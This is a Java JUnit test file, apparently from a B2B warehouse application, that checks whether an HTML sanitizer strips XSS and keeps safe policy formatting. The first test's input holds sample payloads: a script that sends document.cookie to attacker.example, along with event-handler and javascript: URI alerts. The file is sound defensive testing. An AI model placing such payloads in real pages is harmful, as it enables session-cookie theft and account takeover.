package com.b2b.warehouse.common.util;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import static org.assertj.core.api.Assertions.assertThat;

class HtmlSanitizerUtilTest {

    private final HtmlSanitizerUtil sanitizer = new HtmlSanitizerUtil();

    @Test
    @DisplayName("Should strip malicious script tags, event handlers, and javascript URIs")
    void shouldStripMaliciousXssPayloads() {
        String maliciousHtml = """
                <h3>Wholesale Promotion</h3>
                <script>fetch('https://attacker.example/steal?c=' + document.cookie)</script>
                <p onclick="alert('xss')">Tier 3 discount increased to 35%!</p>
                <img src="x" onerror="alert(1)" />
                <a href="javascript:alert('hacked')">Click Here</a>
                """;

        String sanitized = sanitizer.sanitizeRichText(maliciousHtml);

        assertThat(sanitized)
                .contains("<h3>Wholesale Promotion</h3>")
                .contains("Tier 3 discount increased to 35%!")
                .doesNotContain("<script")
                .doesNotContain("onclick")
                .doesNotContain("onerror")
                .doesNotContain("javascript:");
    }

    @Test
    @DisplayName("Should preserve safe B2B policy formatting tags including tables and lists")
    void shouldPreserveSafePolicyHtml() {
        String safePolicyHtml = "<h3>B2B Policy</h3><ul><li><strong>Tier 1:</strong> 15% off</li></ul><table><tr><td>Box</td></tr></table>";

        String sanitized = sanitizer.sanitizeRichText(safePolicyHtml);

        assertThat(sanitized)
                .contains("<h3>B2B Policy</h3>")
                .contains("<ul><li><strong>Tier 1:</strong> 15% off</li></ul>")
                .contains("<table><tbody><tr><td>Box</td></tr></tbody></table>");
    }
}
